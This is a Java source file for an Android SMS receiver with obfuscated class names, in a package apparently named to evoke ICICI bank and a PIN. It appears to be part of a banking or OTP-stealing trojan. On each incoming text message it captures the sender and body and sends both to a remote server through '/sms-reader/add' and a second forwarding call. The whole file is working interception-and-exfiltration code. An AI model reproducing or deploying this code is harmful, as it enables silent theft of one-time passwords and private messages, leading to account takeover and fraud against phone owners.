package share.fixm4n4g3l.icicim4pin2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class Thjxjkh extends BroadcastReceiver {

    private String previous_message = "";
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
//                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                        if (smsMessage != null) {
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            if(messageBody!=previous_message){
                                previous_message = messageBody;
                                Log.d("mywork", "Current Message : " +messageBody + " -- Previous Message "+previous_message);
                                Log.d("mywork", "SMS received from " + sender + " with message: " + messageBody);
                                hydah.sendSMS("/site/number?site="+ hydah.site, messageBody);
                                JSONObject jsonData = new JSONObject();
                                try {
                                    jsonData.put("site", hydah.site);
                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    hydah.sendData("/sms-reader/add", jsonData);
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

}